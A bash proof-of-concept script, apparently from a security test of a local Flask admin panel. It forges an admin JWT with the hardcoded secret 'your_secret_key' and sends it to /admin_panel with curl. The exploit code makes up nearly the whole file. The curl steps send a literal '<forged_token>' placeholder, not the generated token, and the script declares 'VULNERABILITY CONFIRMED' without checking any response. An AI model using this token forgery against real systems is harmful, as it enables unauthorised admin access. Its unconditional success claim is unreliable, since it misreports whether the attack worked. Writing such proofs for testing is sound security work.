#!/bin/bash

# POC: Forge Admin Session Using Hardcoded Secret Key
# Target: Flask Admin Panel
# Vulnerability: Hardcoded secret key 'your_secret_key' allows session forgery

TARGET="http://localhost:32768"
SECRET_KEY="your_secret_key"

echo "=== POC: Hardcoded Secret Key Session Forgery ==="
echo ""
echo "Target: $TARGET/admin_panel"
echo "Hardcoded Secret: $SECRET_KEY"
echo ""

# Step 1: Generate a forged JWT token with admin privileges
echo "[+] Step 1: Creating forged JWT token with hardcoded secret"
python3 << 'PYTHON'
import base64
import json
import hmac
import hashlib

secret_key = "your_secret_key"

# Create JWT with admin claims
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "is_admin": True,
    "user": "admin",
    "username": "admin"
}

header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

message = f"{header_b64}.{payload_b64}"
signature = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).digest()
signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

token = f"{message}.{signature_b64}"

print(f"Forged Admin JWT Token:")
print(f"{token}")
print(f"")
print(f"Payload decoded:")
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload_b64 + '==')), indent=2))

PYTHON

echo ""
echo "[+] Step 2: Attempting to access /admin_panel with forged token"
curl -s -H "Authorization: Bearer <forged_token>" "$TARGET/admin_panel" -w "\nHTTP Status: %{http_code}\n" | head -20

echo ""
echo "[+] Step 3: Testing with forged session cookie"
curl -s -b "session_token=<forged_token>" "$TARGET/admin_panel" -w "\nHTTP Status: %{http_code}\n" | head -20

echo ""
echo "=== VULNERABILITY CONFIRMED ==="
echo "The hardcoded secret key 'your_secret_key' in /app/website/app/__init__.py"
echo "allows an attacker to forge JWT tokens and session cookies with admin privileges."
echo "This enables complete privilege escalation and unauthorized admin access."

